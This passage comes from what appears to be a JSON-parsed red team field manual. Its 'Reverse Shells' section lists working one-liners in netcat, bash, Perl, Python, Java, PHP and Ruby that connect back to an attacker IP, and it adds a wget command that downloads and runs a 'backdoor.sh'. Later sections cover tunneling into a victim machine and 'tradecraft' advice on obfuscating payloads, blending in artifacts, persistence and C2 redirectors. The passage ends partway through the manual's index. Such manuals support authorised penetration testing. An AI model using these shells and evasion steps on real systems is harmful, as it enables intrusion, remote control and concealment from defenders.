      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "telnet <IP_ADDRESS> 25",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "HELO",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "MAIL FROM:<EMAIL_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "RCPT TO: <EMAIL_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DATA",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Thank You.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": ".",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "quit",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Reverse Shells",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Start listener on attack box to catch reverse shells",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc <IP_ADDRESS> <PORT> -e /bin/sh",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Linux reverse shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc <IP_ADDRESS> <PORT> -e cmd.exe",
      "level": 0,
      "metadata": {
        "file_paths": [
          "cmd.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Windows reverse shell",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ADDRESS> <PORT> >/tmp/f",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Netcat work-around when –e option not possible",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "perl -e ‘use Socket; $i=\"<IP_ADDRESS>\"; $p=<PORT>; socket(S,PF_INET, SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,\">&S\");open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};’",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"<IP_ADDRESS>:<PORT>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl without /bin/sh",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"<IP_ADDRESS>:<PORT>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Perl for Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Python",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "python -c ‘import socket,subprocess,os; s=socket.socket(socket.AF_INET,",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "socket.SOCK_STREAM); s.connect((\"<IP_ADDRESS>\",<PORT>)); os.dup2(s.fileno(),0);",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);’",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Java",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "r = Runtime.getRuntime()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<IP_ADDRESS>/<PORT>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "p.waitFor()",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "PHP",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "php -r '$sock=fsockopen(\"<IP_ADDRESS>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");‘",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ruby -rsocket -e'f=TCPSocket.open(\"<IP_ADDRESS>\",<PORT>).to_i; exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<IP_ADDRESS>\",\"<PORT>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby without /bin/sh",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "ruby -rsocket -e 'c=TCPSocket.new(\"<IP_ADDRESS>\",\"<PORT>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ruby for Windows",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "telnet <IP_ADDRESS> <PORT> | /bin/bash | telnet <IP_ADDRESS> <PORT+1>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "XTerm",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xnest :1",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Start Listener (Listens on port 6001)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xhost +<IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Add permission to connect",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "xterm -display <IP_ADDRESS>",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Telnet",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "WGET Script Download & Execute",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "wget -O- http://<IP_ADDRESS>:<PORT>/backdoor.sh | bash",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at:",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet",
      "level": 0,
      "metadata": {
        "urls": [
          "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        ],
        "file_paths": [
          "//pentestmonkey.net"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "http://bit.ly/nuc0N0",
      "level": 0,
      "metadata": {
        "urls": [
          "http://bit.ly/nuc0N0"
        ],
        "file_paths": [
          "//bit.ly"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tunneling",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "FPipe Tunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fpipe.exe –l 1234 –r 80 2.2.2.2",
      "level": 0,
      "metadata": {
        "file_paths": [
          "fpipe.exe",
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Listen on port 1234 and forward to 2.2.2.2 on port 80",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Socat Tunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "socat TCP-LISTEN:1234,fork TCP:2.2.2.2:80",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Listen on port 1234 and forward to 2.2.2.2 on port 80",
      "level": 0,
      "metadata": {
        "file_paths": [
          "2.2.2.2"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "SSL Encapsulated Netcat TunneL (STunnel)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "openssl req -new -x509 -days 365 -nodes -out stunnel.pem -keyout stunnel.pem",
      "level": 0,
      "metadata": {
        "file_paths": [
          "stunnel.pem",
          "stunnel.pem"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listening Server)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Generate SSL certificate",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify /stunnel.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/stunnel.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "client = no",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[netcat server]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "accept = 4444",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "connect = 7777",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "cert = /etc/stunnel/stunnel.pem",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/etc/stunnel/stunnel.pem"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listening Server)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify stunnel configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo stunnel ./stunnel.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "./stunnel.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listening Server)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run stunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify /stunnel.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "/stunnel.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "client = yes",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "[netcat client]",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "accept = 5555",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "connect = <LISTENING_IP>:4444",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Attacker)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Modify stunnel configuration",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "sudo stunnel ./stunnel.conf",
      "level": 0,
      "metadata": {
        "file_paths": [
          "./stunnel.conf"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Attacker)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Run stunnel",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –vlp 7777",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Listening Server)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Listen for netcat connection",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "nc –nv 127.0.0.1 5555",
      "level": 0,
      "metadata": {
        "file_paths": [
          "127.0.0.1"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "(Attacker)",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Connect into victim computer via netcat",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "More info at: https://edzeame.wordpress.com/2014/06/23/setting-up-stunnel-configurations/",
      "level": 0,
      "metadata": {
        "urls": [
          "https://edzeame.wordpress.com/2014/06/23/setting-up-stunnel-configurations/"
        ],
        "file_paths": [
          "//edzeame.wordpress.com"
        ],
        "dates": [
          "2014/06/23"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tradecraft Concerns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Tradecraft Concerns",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "This section outlines various tradecraft considerations that should be made while operating in a live environment.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Artifact Creation and Uploading",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Do created artifact names and configurations blend in with the target environment (service names, descriptions, file names, etc.)?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the payload packed/obfuscated?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Was the payload created matching target system architecture, C2 type, and payload type?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the artifact uploaded to a non-descript location?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Persistence Actions",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Do I have the correct \"permission\" to execute this persistence method (administrator versus user persistence methods)?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Once the persistence executes, is the payload process suspicious?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "After persistence executes, is the implant call back interval too fast or too slow?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Should I log this persistence?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Remote Execution",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the remote machine in scope?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is it normal to see this machine talk to the remote system?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Do I hold the correct permission to remotely execute?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Once the persistence executes, is the payload process suspicious?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Should I remove the artifact after gaining persistence?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Should I log this remote execution?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Infrastructure Setup",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Purchase a VPS for C2 redirection.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSL certs purchased and configured successfully on redirector.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Age redirector as long as possible.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Redirector content uploaded and \"categorized\".",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ProxyPass or similar traffic pass thru technique configured to push implant traffic to team server.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Iptables configured to block unwanted traffic from redirector and Red Team attack machine.",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Passwords changed on redirector, and any other Red Team owned machines.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "SSH keys configured and password protected.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Token Manipulation",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the correct privilege held to run this token manipulation method?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the \"domain\" section of the technique set correctly?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the hash or password still valid (it could be expired)?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Does the user belong to any concerning groups (HBSS admin, firewall admin, etc.)?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is the user account enabled?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Has the user logged in recently?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Has the user authenticated from this machine before?",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Is an active user credential required for this task?",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "End of Day Operations",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Revert all credentials in implant sessions (rev2self, drop_token, etc.).",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Exit any implants no longer needed for the operation.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "code_block",
      "content": "Unlink from all SMB implants (beginning with outer chain and working back).",
      "level": 0,
      "metadata": {
        "language": "shell",
        "single_line": true,
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Sleep down all HTTPS implants to a slower call back interval (such as 4 hours).",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Update any organizational logs with end of day information.",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Index",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "8",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11a, 87",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11a"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11b/g, 87",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11b"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "802.11n, 87",
      "level": 0,
      "metadata": {
        "file_paths": [
          "802.11n"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "A",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "aircrack-ng, 90",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "aireplay-ng, 90",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airmon-ng, 90",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airodump –ng, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "airodump-ng, 90",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "apt-get, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arecord, 67",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arp, 20, 66, 107",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "arping, 107",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "ASCII Table, 112",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "at.exe, 38",
      "level": 0,
      "metadata": {
        "file_paths": [
          "at.exe"
        ],
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "B",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash, 123",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Bash History, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Batch Scripts, 44, 45",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Beef Hook, 91",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "C",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "C Band, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cellular, 87",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "chage, 59",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Cisco, 84",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "crontab, 64",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Curl, 92",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "D",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dd, 62, 63",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "df, 51, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dhclient, 89",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "diff, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dig, 61",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNS Transfer, 121",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "DNSRecon, 85",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "docker, 93",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dos2unix, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dpkg, 58",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscacheutil, 52",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dscl, 51, 52, 53",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "dsquery, 30, 31, 32",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "E",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Ettercap, 107",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "etterfilter, 107",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "Excel Password, 109",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "expand, 24, 30",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "F",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "fdisk, 58, 68",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "file, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
      "content": "find, 23, 62",
      "level": 0,
      "metadata": {
        "source_type": "TXT"
      }
    },
    {
      "type": "paragraph",
